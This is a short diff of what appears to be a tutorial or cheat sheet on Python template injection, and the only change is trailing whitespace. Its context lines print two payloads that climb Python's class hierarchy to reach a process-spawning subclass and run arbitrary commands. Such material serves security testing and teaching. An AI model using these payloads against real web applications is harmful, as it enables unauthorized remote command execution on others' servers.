@@ -19,7 +19,7 @@ Where X is the integer you need to find.
 
 Finally, you can call this method using:
 
-`{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}`
+`{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}`  
 `{{''.__class__.mro()[2].__subclasses__()[233](["PATH_TO_BINARY","ARG_1"])}}`
 
 Where:
